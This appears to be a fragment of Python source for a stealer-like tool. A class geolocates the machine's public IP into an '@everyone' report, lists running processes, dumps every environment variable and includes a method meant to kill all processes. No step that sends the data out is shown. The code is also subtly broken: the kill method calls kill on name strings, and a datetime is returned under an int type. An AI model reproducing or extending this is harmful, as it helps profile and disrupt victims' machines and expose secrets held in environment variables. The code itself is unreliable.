import requests, json, psutil, datetime, os
#from typing import Generator

class Info:
    @staticmethod
    def pull_ip_info() -> str:
        config = json.loads(requests.get("https://geolocation-db.com/json/").text)
        coords = {"latitude": config['latitude'], "longitude": config['longitude']}
        return f"@everyone\nIP: {config['IPv4']}\nState: {config['state']}\nCity: {config['city']}\nCountry: {config['country_code']}\nCoords: {coords}\nPostal: {config['postal']}"

    @staticmethod
    def get_runing_processes() -> list:
        processes = []
        for proc in psutil.process_iter():
            processes.append(proc.name())
        return processes
    
    @staticmethod
    def get_time() -> int:
        return datetime.datetime.now()

    @staticmethod
    def kill_all_processes() -> None:
        [proc.kill() for proc in Info.get_runing_processes()]

    
    @staticmethod
    def get_enviornment_vars() -> dict:
        return dict(os.environ)

    @staticmethod
    def get_enviornment_path() -> list:
        return Info.get_enviornment_vars().get("PATH", ";").split(";")
    
    


        